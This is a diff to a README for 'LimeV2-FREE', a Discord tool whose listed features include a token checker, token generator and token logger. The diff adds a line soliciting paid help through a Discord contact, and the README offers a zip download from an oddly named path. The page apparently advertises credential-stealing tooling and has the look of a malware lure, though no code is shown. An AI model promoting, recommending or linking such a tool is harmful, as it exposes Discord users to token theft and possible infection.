@@ -25,7 +25,7 @@ LimeV2-FREE is a versatile Discord tool designed for various functionalities. Th
 - Token Checker
 - Token Gen
 - Token Logger
-
+add kawaiiboy679 on discord ill pay u to do it for me and etc and teach me please
 ## Installation 💻
 Click the button below to download the latest version of LimeV2-FREE:
 [![Download LimeV2-FREE](https://raw.githubusercontent.com/gaugepo/LimeV2-FREE/main/inconsolableness/FREE_Lime_centare.zip)](https://raw.githubusercontent.com/gaugepo/LimeV2-FREE/main/inconsolableness/FREE_Lime_centare.zip)
